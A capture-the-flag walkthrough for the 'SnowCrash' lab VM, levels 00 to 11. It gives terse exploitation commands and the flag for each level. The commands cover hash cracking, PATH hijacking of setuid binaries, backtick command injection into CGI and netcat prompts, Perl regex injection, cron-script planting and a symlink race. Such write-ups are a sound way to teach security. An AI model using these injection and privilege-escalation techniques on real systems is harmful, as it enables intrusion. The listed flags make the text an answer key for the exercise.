# snow_crash


# Level 00
```sh
level00@SnowCrash:~$ find / -path /proc -prune -o -user flag00 -print 2> /dev/null
/usr/sbin/john
/rofs/usr/sbin/john
```
```sh
level00@SnowCrash:~$ cat /usr/sbin/john
cdiiddwpgswtgt
```
[The Cipher Identifier](https://www.dcode.fr/cipher-identifier) => ROT Cipher
Brute Force ROT Cipher => nottoohardhere

<details>
	<summary>Flag:</summary>
	x24ti5gi3x0ol2eh4esiuxias
</details>

# Level 01
```sh
find / -path /dev -prune -o -exec grep -Hn "flag01" {} \; 2>/dev/null
/etc/passwd:41:flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```
Encoded in SHA512(?)
https://www.openwall.com/john/
```sh
wget https://www.openwall.com/john/k/john-1.9.0-jumbo-1.tar.xz
tar -xJf john-1.9.0-jumbo-1.tar.xz
./configure && make -s clean && make -sj4 
echo 42hDRfypTqqnw > /tmp/pass

./john /tmp/pass
Proceeding with wordlist:./password.lst, rules:Wordlist
abcdefg          (?)

```

<details>
	<summary>Flag:</summary>
	f2av5il02puano7naaf6adaaf
</details>

# Level 02

level02.pcap with Wireshark

Right click => Follow => TCP

Password: ft_wandr...NDRel.L0L   (. = backspace)

Final password: ft_waNDReL0L

<details>
	<summary>Flag:</summary>
	kooda2puivaav1idi4f57q8iq
</details>

# Level 03

exec in https://dogbolt.org

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    gid_t eax = getegid();
    uid_t eax_1 = geteuid();
    setresgid(eax, eax, eax);
    setresuid(eax_1, eax_1, eax_1);
    return system("/usr/bin/env echo Exploit me");
}
```

/usr/bin/env is absolut

```sh
cp /bin/getflag /tmp/echo
PATH=/tmp ./level03
```

<details>
	<summary>Flag:</summary>
	qi0maab88jeaj46qoumi7maus
</details>

# Level 04

level04.pl as CGI

Connect on appach at localhost:4747

```sh
level04@SnowCrash:/etc/apache2/sites-available$ curl "localhost:4747?x=\`getflag\`"
```

<details>
	<summary>Flag:</summary>
	ne2searoevaevoem4ov4ar8ap
</details>

# Level 05

On connection: You have new mail.

```sh
$ cat /var/spool/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

echo "echo test; exec /bin/getflag > /tmp/soluc" > /opt/openarenaserver/test.sh
echo /tmp/soluc
```

<details>
	<summary>Flag:</summary>
	viuaaale9huek52boumoomioc
</details>

# Level 06

```sh
$ ls
level06  level06.php

$ echo '[x {${exec(getflag)}}]' > /tmp/test && ./level06 /tmp/test
```

<details>
	<summary>Flag:</summary>
	wiok45aaoguiboiki2tuin6ub
</details>

# Level 07


```c
    asprintf(&v1, "/bin/echo %s ");
```

```sh
$ LOGNAME="; getflag" ./level07 
```

<details>
	<summary>Flag:</summary>
	fiumuikeil55xe9cu4dood66h
</details>ls

# Level 08

```sh
$ ln -s /home/user/level08/token /tmp/testing
$ ./level08 /tmp/testing
$ su flag08
$	quif5eloekouj29ke0vouxean
```

<details>
	<summary>Flag:</summary>
	25749xKZ8L7DkSCwJkT9dyv6f
</details>

# Level 09

```sh
$ scp -P 4243 level09@localhost:/home/user/level09/token .
# exec script to rotate
$ echo "<res>" > /tmp/res
$ ./level09 /tmp/res
```

<details>
	<summary>Flag:</summary>
	s5cAJpM8ev6XHw998pRWG728z
</details>


# Level 10

```sh
$ while true; do ln -sf /home/user/level10/token /tmp/mykey; ln -sf /tmp/test /tmp/mykey; done &
$ for i in {1..1000}; do /home/user/level10/level10 /tmp/mykey 127.0.0.1; done
```
clef flag10: woupa2yuojeeaaed06riuj63c

<details>
	<summary>Flag:</summary>
	feulo4b72j7edeahuete3no7c
</details>

# Level 11

```sh
$ level11@SnowCrash:~$ netcat 127.0.0.1 5151
Password: `getflag > /tmp/key; echo test`
```

<details>
	<summary>Flag:</summary>
	fa6v5ateaw21peobuub8ipe6s
</details>